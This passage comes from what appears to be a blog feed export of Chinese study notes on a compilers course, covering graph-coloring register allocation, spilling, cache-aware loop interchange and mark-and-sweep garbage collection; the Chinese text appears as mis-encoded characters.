id="å›¾æŸ“è‰²">å›¾æŸ“è‰²</h2><p>å›¾ç€è‰²æ˜¯å¯¹èŠ‚ç‚¹çš„é¢œè‰²åˆ†é…ï¼Œä½¿å¾—é€šè¿‡è¾¹è¿æ¥çš„èŠ‚ç‚¹å…·æœ‰ä¸åŒçš„é¢œè‰²</p><p>å¦‚æœä¸€ä¸ªå›¾å¯ä»¥ç”¨kç§é¢œè‰²æŒ‰ç…§ä¸Šè¿°è§„åˆ™ç€è‰²ï¼Œåˆ™è¯¥å›¾å½¢ä¸ºkâˆ’colorableï¼ˆè¿™é‡Œçš„é¢œè‰²å°±æ˜¯å¯„å­˜å™¨ï¼Œkä¸ºå¯„å­˜å™¨æ•°é‡ï¼‰</p><p>è¿›ä¸€æ­¥çš„ï¼Œå¦‚æœRIGæ˜¯kâˆ’colorableï¼Œåˆ™å­˜åœ¨ä¸è¶…è¿‡kä¸ªå¯„å­˜å™¨çš„å¯„å­˜å™¨åˆ†é…ã€‚</p><p>å›¾æŸ“è‰²ç®—æ³•ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The following works well <span class="hljs-keyword">in</span> practice:<br>  â€“ Pick <span class="hljs-keyword">a</span> node t <span class="hljs-keyword">with</span> fewer than k neighbors<br>  â€“ Put t <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">stack</span> <span class="hljs-title">and</span> <span class="hljs-title">remove</span> <span class="hljs-title">it</span> <span class="hljs-title">from</span> <span class="hljs-title">the</span> <span class="hljs-title">RIG</span><br>  â€“ Repeat <span class="hljs-keyword">until</span> <span class="hljs-keyword">the</span> graph has <span class="hljs-literal">one</span> node<br>Assign colors <span class="hljs-built_in">to</span> nodes <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">stack</span><br>  â€“ Start <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> node added<br>  â€“ At <span class="hljs-keyword">each</span> step pick <span class="hljs-keyword">a</span> color different <span class="hljs-built_in">from</span> those assigned<br>  <span class="hljs-built_in">to</span> already colored neighbors<br></code></pre></td></tr></table></figure><p>ä¸‹é¢è¿™å¼ å›¾é‡Œç¬¬å››ä¸ªæ‰ç¬¦åˆé¢˜æ„</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050704.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="å˜é‡æº¢å‡º">å˜é‡æº¢å‡º</h2><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152930506.png"alt="image-20230520152930506" /><figcaption aria-hidden="true">image-20230520152930506</figcaption></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•å°†æ‰€æœ‰å€¼éƒ½ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œè¿™ä¸ªæ—¶å€™ä¼šé€‰æ‹©ä¸€äº›å˜é‡æ”¾å…¥å†…å­˜ï¼›å…¶ä»–å˜é‡ç»§ç»­å›¾æŸ“è‰²ï¼Œè¿™äº›æº¢å‡ºçš„å˜é‡å°†ä¼šæœ‰ä»¥ä¸‹æ“ä½œï¼š</p><p><strong>é€‰æ‹©å“ªäº›å˜é‡æº¢å‡ºå‘¢ï¼Ÿ</strong></p><p>å¯èƒ½çš„å¯å‘å¼æ–¹æ³•ï¼š</p><ul><li>spillå†²çªæœ€å¤šçš„ä¸´æ—¶å˜é‡ï¼ˆè¿™ä¸ªæ—¶å€™è¾¹æ¯”è¾ƒå¤šï¼‰</li><li>spillå®šä¹‰å’Œç”¨é€”å¾ˆå°‘çš„ä¸´æ—¶å˜é‡ï¼ˆå› ä¸ºå¾ˆå°‘ç”¨ï¼Œæ”¾åˆ°å†…å­˜é‡Œï¼Œä¹Ÿæ— ä¼¤å¤§é›…ï¼‰</li><li>åœ¨å†…éƒ¨å¾ªç¯ä¸­é¿å…spillï¼ˆå› ä¸ºå¾ªç¯é‡Œä¸€ç›´ä¼šå¤ç”¨ç¼“å­˜æˆ–è€…å¯„å­˜å™¨ï¼Œå¦‚æœspilläº†å˜é‡åˆ°å†…å­˜ï¼Œå¯èƒ½ä¼šå¾ˆå¤§ç¨‹åº¦é™ä½è¿è¡Œé€Ÿåº¦ï¼Œè§ä¸‹é¢ç¼“å­˜éƒ¨åˆ†ï¼‰</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Before</span> <span class="hljs-keyword">each</span> operation that reads f, <span class="hljs-keyword">insert</span><br>f := <span class="hljs-keyword">load</span> fa<br><span class="hljs-keyword">After</span> <span class="hljs-keyword">each</span> operation that writes f, <span class="hljs-keyword">insert</span><br>store f, fa<br></code></pre></td></tr></table></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152957854.png"alt="image-20230520152957854" /><figcaption aria-hidden="true">image-20230520152957854</figcaption></figure><p>é‡æ–°è®¡ç®—æ´»è·ƒå˜é‡ï¼š</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520153015201.png"alt="image-20230520153015201" /><figcaption aria-hidden="true">image-20230520153015201</figcaption></figure><blockquote><p>New liveness information is almost as before</p><p>â€‹ â€“ Note f has been split into three temporaries</p><p>fi is live only</p><p>â€‹ â€“ Between a fi := load fa and the next instruction</p><p>â€‹ â€“ Between a store fi, fa and the preceding instr.</p><p>Spilling reduces the live range of f</p><p>â€‹ â€“ And thus reduces its interferences</p><p>â€‹ â€“ Which results in fewer RIG neighbors</p></blockquote><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520153209988.png"alt="image-20230520153209988" /><figcaption aria-hidden="true">image-20230520153209988</figcaption></figure><h2 id="ç®¡ç†ç¼“å­˜">ç®¡ç†ç¼“å­˜</h2><p>ç¼“å­˜çš„é€Ÿåº¦ä»‹äºå¯„å­˜å™¨å’Œå†…å­˜ä¸­é—´ï¼Œå¯ä½œä¸ºç¼“å†²å­˜åœ¨ï¼Œå¦‚æœæ²¡æœ‰ç¼“å†²çš„è¯ï¼Œå¯„å­˜å™¨å’Œå†…å­˜ç›´æ¥äº¤äº’ï¼Œç”±äºè®¿é—®å†…å­˜çš„é€Ÿåº¦è¿œè¿œå°äºè®¿é—®å¯„å­˜å™¨çš„é€Ÿåº¦ï¼Œè¿™æ ·æ•´ä¸ªç¨‹åºä¼šæ˜¯ç›¸å¯¹è¾ƒæ…¢çš„ï¼Œæ‰€ä»¥ç¼“å­˜å¾ˆé‡è¦ï¼›</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520151753508.png"alt="image-20230520151753508" /><figcaption aria-hidden="true">image-20230520151753508</figcaption></figure><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¯„å­˜å™¨å’Œå†…å­˜äº¤äº’çš„å€¼ï¼Œä¼šæ”¾åœ¨ç¼“å­˜é‡Œï¼Œæ¯æ¬¡å¯„å­˜å™¨è®¿é—®æ•°æ®å…ˆå»ç¼“å­˜é‡ŒæŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæ‰å»å†…å­˜é‡ŒæŸ¥æ‰¾ï¼Œå¦‚æœç¼“å­˜ä¸€ç›´æ²¡æœ‰å‘½ä¸­ï¼Œé‚£ä¹ˆç¼“å­˜ä¹Ÿå°±å¤±å»äº†å®ƒçš„ä»·å€¼ã€‚</p><ul><li>ç¼–è¯‘å™¨éå¸¸æ“…é•¿ç®¡ç†å¯„å­˜å™¨<ul><li>æ¯”ç¨‹åºå‘˜è¦å¥½å¾—å¤š</li></ul></li><li>ä½†æ˜¯ç¼–è¯‘å™¨ä¸å–„äºç®¡ç†ç¼“å­˜<ul><li>è¿™ä¸ªé—®é¢˜ä»ç„¶ç•™ç»™ç¨‹åºå‘˜</li><li>å°šæœ‰ä¸€ä¸ªæœªè§£å†³çš„é—®é¢˜ï¼Œç¼–è¯‘å™¨å¯ä»¥åšäº›ä»€ä¹ˆæ¥æé«˜ç¼“å­˜æ€§èƒ½</li></ul></li></ul><p>è€ƒè™‘å¦‚ä¸‹ç¨‹åºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span>(j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">10</span>; j++)<br><span class="hljs-attribute">for</span>(i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">1000000</span>; i++) <br><span class="hljs-attribute">a</span>[i] *= b[i]<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ç”±äºå†…éƒ¨å¾ªç¯å¾ˆå¤§ï¼Œè€Œä¸”æ¯æ¬¡iéƒ½ä¼šå˜åŒ–ï¼Œå¦‚æœç¼“å­˜æ²¡æœ‰è¶³å¤Ÿçš„å¤§å°ï¼Œé‚£ä¹ˆa[i]å’Œb[i]å°±ä¸€ç›´å‘½ä¸­ä¸äº†ç¼“å­˜ï¼›ç›¸åï¼Œä¸‹é¢çš„ä»£ç åœ¨10æ¬¡ä»¥å†…ï¼Œä¸€å®šéƒ½æ˜¯å¯ä»¥ç¼“å­˜çš„ï¼Œé€Ÿåº¦è‡³å°‘æ¯”ä¸Šé¢ä»£ç å¿«10å€ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span>(i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">1000000</span>; i++)<br><span class="hljs-attribute">for</span>(j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">10</span>; j++) <br><span class="hljs-attribute">a</span>[i] *= b[i]<br></code></pre></td></tr></table></figure><p>åƒè¿™ç§äº¤æ¢forå¾ªç¯çš„ä¼˜åŒ–ï¼Œå¾ˆå°‘æœ‰ç¼–è¯‘å™¨å®ç°ï¼Œå› ä¸ºéš¾ä»¥å‘ç°ä»€ä¹ˆæ ·çš„å¾ªç¯å¯ä»¥ä¼˜åŒ–ï¼Œäº‹å®ä¸Šï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯éœ€è¦ç¨‹åºå‘˜è‡ªå·±å»ä¼˜åŒ–è¿™ç§caseçš„ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 11 Automatic Memory Management</title>
    <link href="/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%B8%80/"/>
    <url>/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="å¼•å‡º">å¼•å‡º</h2><p>è‡ªåŠ¨å†…å­˜ç®¡ç†ä¹Ÿç§°ä¹‹ä¸ºåƒåœ¾å›æ”¶(garbage collection)</p><p>æ‰‹åŠ¨ç®¡ç†å†…å­˜æœ‰å¾ˆå¤šå‡ºä¹æ„æ–™çš„bugï¼š</p><ul><li>å¿˜è®°é‡Šæ”¾æ²¡æœ‰è¢«ä½¿ç”¨çš„å†…å­˜</li><li>å¿˜è®°å»æ‰ä¸€äº›æ— ç”¨å¼•ç”¨ï¼Œæˆ–è€…æ˜¯é‡æŒ‡é’ˆ</li><li>å¶ç„¶çš„å†…å­˜è¦†ç›–</li><li>...</li></ul><p>å†…å­˜ç›¸å…³bugå¾ˆéš¾å‘ç°(æ¯”å¦‚å†…å­˜æº¢å‡ºï¼Œå°±éœ€è¦æ’æŸ¥å¾ˆé•¿æ—¶é—´)</p><p>ğŸŒ°ï¼š</p><p>æŸä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨äº†ï¼Œä½†æ˜¯å¯¹åº”çš„æŒ‡é’ˆè¿˜åœ¨ï¼›çªç„¶åé¢è¯¥å¯¹è±¡è¢«è¦†ç›–äº†ï¼Œä½†æ˜¯æŒ‡é’ˆä»ç„¶å¼•ç”¨è¿™å—å†…å­˜ï¼Œè¿™ä¸ªæ—¶å€™ä½¿ç”¨è¿™ä¸ªæŒ‡é’ˆçš„è¯»å†™è¿˜æ˜¯æŒ‰ç…§åŸæ¥çš„ç±»å‹è¿›è¡Œè¯»å†™ï¼Œå°±å¾ˆå®¹æ˜“å‡ºç°é”™è¯¯(åŸç±»å‹æ˜¯8bitå¤§å°ï¼Œç°åœ¨çš„ç±»å‹æ˜¯16bitå¤§å°è¿™ç§æƒ…å†µ)</p><p>å¦‚ä½•è‡ªåŠ¨ç®¡ç†å†…å­˜å‘¢ï¼Ÿ</p><p>æ€è·¯ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºçš„æ—¶å€™å°±ä¼šåŒæ—¶åˆ†é…ç©ºé—´ï¼›ä½†æ˜¯å½“æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´å¯ç”¨çš„æ—¶å€™ï¼Œæ˜¯å¦å¯ä»¥å¤ç”¨é‚£äº›æ²¡æœ‰è¢«ä½¿ç”¨(å¼•ç”¨)çš„å¯¹è±¡çš„ç©ºé—´å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¦‚ä½•å¾—çŸ¥ä¸€ä¸ªå¯¹è±¡"æ²¡æœ‰è¢«å†æ¬¡ä½¿ç”¨å‘¢"</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">let</span> x: A &lt;- new A <span class="hljs-keyword">in</span> &#123; x &lt;- y; ... &#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç é‡ŒnewAç”Ÿæˆçš„Aå¯¹è±¡åé¢è¢«è¦†ç›–äº†ï¼Œè¿™ä¸ªAå¯¹è±¡å°±æ˜¯æ²¡æœ‰è¢«å†æ¬¡ä½¿ç”¨çš„å¯¹è±¡(è¿™é‡Œä¸è€ƒè™‘å…¶ä»–ä»£ç ï¼Œä»…è€ƒè™‘æœ¬è¡Œä»£ç )ï¼Œxå’Œyå…±åŒå¼•ç”¨ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ä¸ªAå¯¹è±¡è¢«ç§°ä½œä¸ºä¸å¯è¾¾å¯¹è±¡</p><p>ä¸å¯è¾¾å¯¹è±¡å®šä¹‰ï¼Œå½“ä¸”ä»…å½“ï¼š</p><ul><li>å­˜åœ¨å¯„å­˜å™¨æŒ‡å‘äº†å¯¹è±¡xï¼Œæˆ–è€…</li><li>å­˜åœ¨æŸä¸€ä¸ªå¯è¾¾å¯¹è±¡yæŒ‡å‘è¿™ä¸ªx</li></ul><p>è€ƒè™‘å¦‚ä¸‹ä»£ç ï¼šifåˆ†æ”¯å§‹ç»ˆä¸ºTrue</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe">x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>;<br>y &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>;<br>x &lt;- y;<br><span class="hljs-keyword">if</span> alwaysTrue() then x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span> <span class="hljs-keyword">else</span> x.foo() fi<br></code></pre></td></tr></table></figure><p>å‡è®¾åœ¨<code>x &lt;- y</code> ä¹‹åï¼Œyæ˜¯éæ´»è·ƒå˜é‡ï¼Œè¿™é‡Œï¼š</p><ul><li>Aæ˜¯ä¸å¯è¾¾çš„</li><li>Bæ˜¯å¯è¾¾çš„ï¼Œé€šè¿‡xï¼Œä½†æ˜¯Bä¹‹åå†ä¹Ÿæ²¡æœ‰è¢«ä½¿ç”¨è¿‡ï¼›</li></ul><p>æ‰€ä»¥ï¼Œåˆ¤æ–­å¯è¾¾å’Œä¸å¯è¾¾åªæ˜¯ä¸€ç§è¿‘ä¼¼æ‰‹æ®µï¼›</p><p>å¯ä»¥é€šè¿‡ä»¥å¯„å­˜å™¨ä¸ºèµ·ç‚¹éå†å¼•ç”¨é“¾ï¼Œå¯»æ‰¾æ‰€æœ‰å¯è¾¾å¯¹è±¡(ä¸ºä»€ä¹ˆä»¥å¯„å­˜å™¨ä¸ºèµ·ç‚¹ï¼Œå› ä¸ºåªæœ‰ä¿å­˜åœ¨å¯„å­˜å™¨çš„å˜é‡æ‰è¯´æ˜æ˜¯å‚ä¸è®¡ç®—çš„æ´»è·ƒçš„å¯¹è±¡)ï¼Œæ€»çš„æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ¯”è¾ƒå¸¸è§çš„åƒåœ¾å›æ”¶ç®—æ³•ï¼š</p><ul><li>æ ‡è®°æ¸…é™¤(mark and sweep)</li><li>å¤åˆ¶è½¬ç§»(stop and copy)</li><li>å¼•ç”¨è®¡æ•°(reference count)</li></ul><p>å‰ä¸¤ç§éƒ½æ˜¯å†…å­˜è€—å°½çš„æ—¶å€™ï¼Œæ‰åƒåœ¾å›æ”¶ï¼›å¼•ç”¨è®¡æ•°ä¸æ˜¯ç­‰å¾…å†…å­˜è€—å°½çš„æ‰å¼€å§‹è¿›è¡Œï¼Œåœ¨æ²¡æœ‰æŒ‡é’ˆæŒ‡å‘è¯¥å¯¹è±¡æ—¶å°è¯•æ”¶é›†è¯¥å¯¹è±¡</p><h2 id="mark-and-sweepæ ‡è®°æ¸…é™¤">mark and sweep(æ ‡è®°æ¸…é™¤)</h2><p>æ ‡è®°æ¸…é™¤æœ‰ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ul><li>the mark phase: æ‰¾åˆ°å¯è¾¾å¯¹è±¡(rearchable objects)</li><li>the sweep phase: æ”¶é›†å¯å›æ”¶å¯¹è±¡</li></ul><p>å®ç°æ–¹å¼ï¼š</p><p>æ¯ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªé¢å¤–çš„æ ‡è®°æ˜¯å¦å¯å›æ”¶çš„bitä½</p><ul><li>è¯¥bitä½åˆå§‹åŒ–ä¸º0</li><li>åœ¨mark phaseæœŸé—´ï¼Œå¯¹äºæ‰€æœ‰çš„å¯è¾¾å¯¹è±¡è®¾ç½®ä¸º1</li></ul><p><strong>mark phase:</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> todo = &#123;<span class="hljs-keyword">all</span> roots&#125;<br><span class="hljs-keyword">while</span> todo != ç©ºé›† <span class="hljs-keyword">do</span><br>pick v å±äº todo<br>todo &lt;- todo - &#123;v&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">mark</span>(v) == <span class="hljs-number">0</span> then<br><span class="hljs-keyword">mark</span>(v) &lt;- <span class="hljs-number">1</span><br><span class="hljs-keyword">let</span> v1, v2, ..., <span class="hljs-keyword">vn</span> <span class="hljs-keyword">be</span> the pointers contained in v<br>todo &lt;- todo å¹¶é›† &#123;v1, v2, ..., <span class="hljs-keyword">vn</span>&#125;<br>fi<br>od<br></code></pre></td></tr></table></figure><p><strong>sweep phase:</strong></p><p>æ¸…é™¤é˜¶æ®µæ‰«æå †ç©ºé—´é‡Œå¯ä»¥æ¸…é™¤çš„å¯¹è±¡(ä¹Ÿå°±æ˜¯æ¯”ç‰¹æ ‡è®°ä»ä¸º0çš„å¯¹è±¡)ï¼Œè¿™äº›å¯¹è±¡æ˜¯ä¸å¯è¾¾çš„ï¼Œå¯ä»¥è¢«è§†ä½œ"åƒåœ¾"ã€‚è¿™äº›åƒåœ¾å¯¹è±¡å¯ä»¥åœ¨æ¸…é™¤é˜¶æ®µå½¢æˆä¸€æ®µé“¾è¡¨(å¯ä»¥é¿å…å †å†…å­˜ç¢ç‰‡)</p><p>æ¸…é™¤é˜¶æ®µè¿‡åï¼Œä¹‹å‰è¢«è®¾ç½®ä¸º1çš„å¯¹è±¡åº”è¯¥é‡ç½®ä¸º0ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">siseof</span><span class="hljs-params">(p)</span></span> is the size of block starting at pï¼Œ<span class="hljs-built_in">sizeof</span>(p)è¡¨ç¤ºpå¯¹è±¡æ‰€å æ®çš„å¤§å°ï¼Œè¿™é‡Œé»˜è®¤å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹è±¡çš„å†…å­˜å¸ƒå±€æ˜¯è¿ç»­çš„<br><br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-attribute">bottom</span> of heap<br>while <span class="hljs-selector-tag">p</span> &lt; <span class="hljs-attribute">top</span> of heap fp<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">mark</span>(p) == <span class="hljs-number">1</span> then<br><span class="hljs-selector-tag">mark</span>(p) &lt;- <span class="hljs-number">0</span><br><span class="hljs-keyword">else</span><br>add block <span class="hljs-selector-tag">p</span>...(<span class="hljs-selector-tag">p</span> + <span class="hljs-built_in">sizeof</span>(p) - <span class="hljs-number">1</span>) to freelist<br>fi<br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-selector-tag">p</span> + <span class="hljs-built_in">sizeof</span>(p)<br>od<br><br>è¿™ä¸€æ®µä»£ç çš„å¤§æ¦‚æ„æ€å°±æ˜¯ä»å †çš„èµ·ç‚¹å¼€å§‹å‡ºå‘ï¼Œç›´åˆ°å †çš„ç»ˆç‚¹ï¼Œå¦‚æœå‘ç°pä¸º<span class="hljs-number">1</span>ï¼Œåˆ™é‡ç½®ä¸º<span class="hljs-number">0</span>ï¼›å¦åˆ™ï¼Œè¯´æ˜æ˜¯åƒåœ¾å¯¹è±¡ï¼ŒæŠŠ<span class="hljs-selector-attr">[start, start + sizeof(p)]</span>çš„å†…å­˜ä¸²åˆ°freelisté“¾è¡¨é‡Œï¼Œåœ¨æ¯ä¸€è½®ç»“æŸåï¼Œåˆ«å¿˜äº†å¯¹på¢åŠ æœ¬æ¬¡å¯¹è±¡çš„åç§»é‡<br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼šè¿™é‡Œå‡è®¾åªæœ‰ä¸€ä¸ªå¯„å­˜å™¨ï¼Œåˆå§‹çš„æ—¶å€™å¯„å­˜å™¨æŒ‡å‘Aå¯¹è±¡</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br><br>æ ‡è®°é˜¶æ®µå:<br>root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br><br>æ¸…é™¤é˜¶æ®µå:<br>root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šæ™®é€šæ ‡è®°-æ¸…é™¤çš„ç¼ºç‚¹ï¼š</p><p>ç”±äºä¸€æ—¦ä½¿ç”¨è¯¥ç®—æ³•çš„æ—¶å€™ï¼Œå·²ç»æ˜¯å†…å­˜ä¸å¤Ÿç”¨äº†ï¼Œç„¶è€Œåœ¨<strong>æ ‡è®°é˜¶æ®µ</strong>è¿˜è¦å€Ÿç”¨å†…å­˜å»ç»´æŠ¤todoè¿™æ ·ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå¹¶ä¸”è¿™ä¸ªç»“æ„çš„å¤§å°æ˜¯ä¸å—æ§åˆ¶çš„ï¼Œæœ‰å¯èƒ½æœ‰è®¸å¤šåƒåœ¾éœ€è¦å›æ”¶ï¼Œè¿™æ˜¯å’Œåƒåœ¾å›æ”¶çš„ç›®çš„ç›¸æ‚–çš„</p><p><strong>æ”¹è¿›ï¼š</strong></p><p>todoè¿™æ ·çš„æ•°ç»“æ„å¯å¦ä¸å¼€è¾Ÿæ–°çš„ç©ºé—´ï¼Ÿ</p><p>todoè¿™ä¸ªæ•°æ®ç»“æ„æ˜¯ä¸ºäº†å¯»æ‰¾å¯è¾¾å¯¹è±¡ï¼Œé‚£ä¹ˆå¯å¦ç›´æ¥éå†å¯¹è±¡å¼•ç”¨å›¾ï¼ŒæŠŠå¯è¾¾å¯¹è±¡çš„bitæ ‡å¿—ä½è®¾ç½®ä¸ºå‘¢ï¼Ÿ</p><p>å¯¹å›¾dfséå†ï¼Œä½†æ˜¯å¼•ç”¨æ˜¯å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯å•å‘çš„ï¼Œå¦‚ä½•åœ¨å›¾é‡Œå›æº¯(åœ¨éå†çš„åŒæ—¶åè½¬é“¾è¡¨ï¼Œè¿™æ ·å›æº¯çš„æ—¶å€™æ²¿ç€åè½¬æŒ‡é’ˆå³å¯)ï¼Œè¿™é‡Œå®é™…æ“ä½œçš„æ—¶å€™éœ€è¦æ³¨æ„å€Ÿç”¨ä¸´æ—¶å˜é‡(å¯„å­˜å™¨)å»å­˜å‚¨å½“å‰éå†èŠ‚ç‚¹ï¼Œä»¥ä¾¿ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä½¿ç”¨</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cur.next</span> = tmp(åè½¬) // è¿æ¥ä¸Šä¸€ä¸ªèŠ‚ç‚¹<br><span class="hljs-attr">tmp</span> = cur<span class="hljs-comment">; // ç°åœ¨tmpæ˜¯å½“å‰èŠ‚ç‚¹ï¼Œç»™ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä½¿ç”¨</span><br><span class="hljs-attr">cur</span> = cur.next<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¯¹è±¡åœ¨è¢«åˆ†é…çš„æ—¶å€™ä¸€èˆ¬æŒ‰å¦‚ä¸‹è§„åˆ™è¿›è¡Œåˆ†é…ï¼š</p><ul><li>æŒ‘é€‰å°½é‡å¤§çš„ç©ºé—´å—</li><li>æŒ‰éœ€åˆ†é…</li><li>é¡ºåºä¸”è¿ç»­åˆ†é…ï¼Œæ¯”å¦‚æœ‰100ä¸ªbitå¤§å°çš„è‡ªå·¦å‘å³çš„è¿ç»­å†…å­˜ç©ºé—´ï¼Œç°åœ¨è¦åˆ†é…50bitç»™æŸä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆåˆ†é…çš„å°±æ˜¯å‰50bit</li></ul></blockquote><p>æ 